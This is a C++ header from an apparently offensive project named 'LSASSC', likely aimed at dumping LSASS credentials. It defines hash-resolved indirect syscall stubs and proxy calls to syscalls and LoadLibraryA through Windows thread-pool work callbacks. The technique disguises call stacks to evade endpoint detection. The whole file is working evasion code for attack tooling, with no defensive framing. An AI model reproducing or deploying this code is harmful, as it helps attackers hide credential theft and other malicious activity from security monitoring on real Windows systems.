#ifndef LSASSC_PROXYCALLER_H
#define LSASSC_PROXYCALLER_H

#include <windows.h>
#include "Native.h"
#include "Macros.h"

EXTERN_C VOID CALLBACK ProxyCaller(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);
EXTERN_C VOID CALLBACK ProxyLoader(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_WORK Work);

typedef struct _HELPER {
    D_TYPE(TpAllocWork)
    D_TYPE(TpPostWork)
    D_TYPE(TpReleaseWork)
} HELPER, *PHELPER;

EXTERN PHELPER pHelper;

template<UINT64 ArgCount>
struct SYSCALL;

template<UINT64 ArgCount>
BOOL FetchSyscallStub(_Inout_ SYSCALL<ArgCount>* pSyscall, _In_ ULONG ulSyscallHash);

template<UINT64 ArgCount>
BOOL FindSyscallInstruction(_Inout_ SYSCALL<ArgCount>* pSyscall);

template<UINT64 ArgCount>
struct SYSCALL_ARGS {
    UINT_PTR    pSyscallInstruction;
    DWORD       dwSsn;
    UINT64      argCount = ArgCount;
    UINT_PTR    pArgs[ArgCount];
};

template<UINT64 ArgCount>
struct SYSCALL {
    UINT_PTR    pSyscallInstruction;
    DWORD       dwSsn;
    SYSCALL_ARGS<ArgCount> syscallArgs;

    VOID ProxyCall(_In_ ...) {
        PTP_WORK WorkReturn = NULL;
        va_list argsList;
        va_start(argsList, ArgCount);

        for (int i = 0; i < ArgCount; ++i) {
            syscallArgs.pArgs[i] = va_arg(argsList, UINT_PTR);
        }

        pHelper->TpAllocWork(
                &WorkReturn,
                (PTP_WORK_CALLBACK)ProxyCaller,
                &syscallArgs,
                NULL
                );

        pHelper->TpPostWork(WorkReturn);
        pHelper->TpReleaseWork(WorkReturn);
        WaitForSingleObject(NtCurrentProcess(), 1);
    }

    BOOL Init(_Inout_ SYSCALL<ArgCount>* pSyscall, _In_ ULONG ulSyscallHash) {
        if (!FetchSyscallStub<ArgCount>(pSyscall, ulSyscallHash)) {
            return FALSE;
        }

        if (!FindSyscallInstruction<ArgCount>(pSyscall)) {
            return FALSE;
        }
        syscallArgs.dwSsn = dwSsn;
        syscallArgs.pSyscallInstruction = pSyscallInstruction;
        return TRUE;
    }
};

struct PROXYLOAD_ARGS {
    UINT_PTR fnpLoadLibrary;
    PCHAR    pLibrary;
};

struct PROXYLOAD {
    PROXYLOAD_ARGS proxyLoadArgs;

    VOID Load(_In_ PCHAR pLibrary) {
        PTP_WORK WorkReturn = NULL;
        proxyLoadArgs.pLibrary = pLibrary;

        pHelper->TpAllocWork(
                &WorkReturn,
                (PTP_WORK_CALLBACK)ProxyLoader,
                &proxyLoadArgs,
                NULL
        );

        pHelper->TpPostWork(WorkReturn);
        pHelper->TpReleaseWork(WorkReturn);
        WaitForSingleObject(NtCurrentProcess(), 1);
    }

    BOOL Init() {
        proxyLoadArgs.fnpLoadLibrary = U_PTR(GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"));
        if (!proxyLoadArgs.fnpLoadLibrary) {
            return FALSE;
        }
        return TRUE;
    }
};

BOOL InitSyscalls();

#endif //LSASSC_PROXYCALLER_H
